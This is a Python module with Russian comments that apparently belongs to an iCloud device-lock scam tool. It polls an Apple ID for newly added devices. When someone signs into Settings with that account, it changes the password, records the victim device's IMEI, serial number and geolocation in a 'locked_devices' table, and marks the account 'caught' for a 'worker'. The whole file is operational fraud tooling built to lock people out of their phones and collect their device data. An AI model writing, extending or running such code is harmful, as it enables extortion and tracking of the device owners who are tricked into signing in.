import asyncio
from datetime import datetime
from typing import Dict, Optional, List
from icloudpy import ICloudPyService
from utils.logger import logger
from core.detector import LoginDetector
from core.device_info import DeviceInfoCollector
from core.password_changer import PasswordChanger

class AccountMonitor:
    """
    Мониторинг одного аккаунта: проверка новых устройств, определение типа входа,
    автоматическая смена пароля при входе в Настройки.
    """
    
    def __init__(self, account: Dict, worker_id: int, db, session_id: int):
        self.account = account
        self.worker_id = worker_id
        self.db = db
        self.session_id = session_id
        self.detector = LoginDetector()
        self.info_collector = DeviceInfoCollector()  # можно передать токен для IMEI
        self.password_changer = PasswordChanger()
        
        self.api: Optional[ICloudPyService] = None
        self.known_devices: List[Dict] = []  # храним id устройств
        self.start_time = datetime.now()
        self.is_running = True
        self.last_check_time = datetime.now()
    
    async def initialize(self) -> bool:
        """Инициализация подключения к iCloud и получение списка известных устройств"""
        try:
            self.api = ICloudPyService(
                self.account['apple_id'],
                self.account['current_password']
            )
            # Получаем список устройств
            devices = self.api.devices
            self.known_devices = [{'id': d.id} for d in devices]
            logger.info(f"✅ Initialized monitor for {self.account['apple_id']}, known devices: {len(self.known_devices)}")
            return True
        except Exception as e:
            logger.error(f"Failed to initialize monitor for {self.account['apple_id']}: {e}")
            return False
    
    def _get_check_interval(self) -> int:
        """Адаптивный интервал проверки (секунды)"""
        elapsed = (datetime.now() - self.start_time).total_seconds() / 60
        if elapsed < 5:      # первые 5 минут – чаще
            return 30
        elif elapsed < 30:   # 5-30 минут – стандартно
            return 60
        else:                # после 30 минут – реже
            return 120
    
    async def check_once(self) -> Dict:
        """
        Однократная проверка: есть ли новые устройства.
        Возвращает:
            {
                "has_new_device": bool,
                "login_type": "settings" / "appstore" / None,
                "device_data": dict,
                "device_obj": device
            }
        """
        if not self.api:
            return {"has_new_device": False}
        
        try:
            current_devices = self.api.devices
            current_ids = [d.id for d in current_devices]
            known_ids = [d['id'] for d in self.known_devices]
            
            # Ищем новые устройства
            for device in current_devices:
                if device.id not in known_ids:
                    # Получаем детальную информацию
                    device_info = device.status()
                    location = device.location() if hasattr(device, 'location') else None
                    
                    # Определяем тип входа
                    login_type = self.detector.detect_login_type(device_info, location)
                    
                    # Собираем расширенную информацию (модель, серийник, IMEI, гео)
                    collected_info = await self.info_collector.collect_device_info(device_info, location)
                    
                    # Логируем событие в БД
                    await self.db.log_login_event(
                        account_id=self.account['id'],
                        session_id=self.session_id,
                        login_type=login_type,
                        device_info=collected_info,
                        action="detected"
                    )
                    
                    # Добавляем устройство в известные, чтобы не детектить повторно
                    self.known_devices.append({'id': device.id})
                    
                    return {
                        "has_new_device": True,
                        "login_type": login_type,
                        "device_data": collected_info,
                        "device_obj": device
                    }
        except Exception as e:
            logger.error(f"Check error for {self.account['apple_id']}: {e}")
        
        return {"has_new_device": False}
    
    async def run_monitoring(self):
        """Запуск непрерывного цикла мониторинга"""
        logger.info(f"🚀 Starting monitoring for {self.account['apple_id']}")
        
        while self.is_running:
            try:
                result = await self.check_once()
                
                if result.get("has_new_device"):
                    if result["login_type"] == "settings":
                        # УСПЕХ: вход в Настройки → меняем пароль и завершаем
                        await self._handle_settings_login(result)
                        break  # мониторинг завершён, аккаунт пойман
                    else:
                        # App Store – только уведомление, продолжаем мониторинг
                        await self._handle_appstore_login(result)
                
                interval = self._get_check_interval()
                self.last_check_time = datetime.now()
                await asyncio.sleep(interval)
                
            except Exception as e:
                logger.error(f"Monitoring error for {self.account['apple_id']}: {e}")
                await asyncio.sleep(60)
    
    async def _handle_settings_login(self, result: Dict):
        """
        Обработка входа в Настройки:
        - Сменить пароль через Playwright
        - Сохранить устройство в locked_devices
        - Обновить статус аккаунта
        - Завершить сессию
        """
        logger.info(f"🎯 SETTINGS LOGIN detected for {self.account['apple_id']}")
        
        # 1. Меняем пароль
        change_result = await self.password_changer.change_password(self.account)
        
        if change_result["success"]:
            new_password = change_result["new_password"]
            # 2. Обновляем пароль в БД
            await self.db.update_account_password(self.account['id'], new_password)
            
            # 3. Сохраняем устройство в таблицу locked_devices
            device_data = result["device_data"]
            await self.db.save_locked_device({
                "account_id": self.account['id'],
                "worker_id": self.worker_id,
                "device_model": device_data.get("device_model"),
                "imei": device_data.get("imei"),
                "serial_number": device_data.get("serial_number"),
                "location_lat": device_data.get("location_lat"),
                "location_lon": device_data.get("location_lon"),
                "status": "active"
            })
            
            # 4. Меняем статус аккаунта на "caught"
            await self.db.update_account_status(self.account['id'], "caught")
            
            # 5. Завершаем сессию мониторинга
            await self.db.end_session(self.session_id)
            
            logger.info(f"✅ Account {self.account['apple_id']} successfully captured, new password set")
        else:
            logger.error(f"❌ Failed to change password for {self.account['apple_id']}: {change_result.get('error')}")
    
    async def _handle_appstore_login(self, result: Dict):
        """
        Обработка входа в App Store:
        - Логируем, но пароль не меняем
        - В реальном боте здесь будет уведомление воркеру
        """
        logger.info(f"⚠️ APP STORE login detected for {self.account['apple_id']}, password NOT changed")
        # В будущем здесь можно отправить сообщение воркеру через callback
        pass
    
    def stop(self):
        """Остановка мониторинга"""
        self.is_running = False
        logger.info(f"🛑 Stopped monitoring for {self.account['apple_id']}")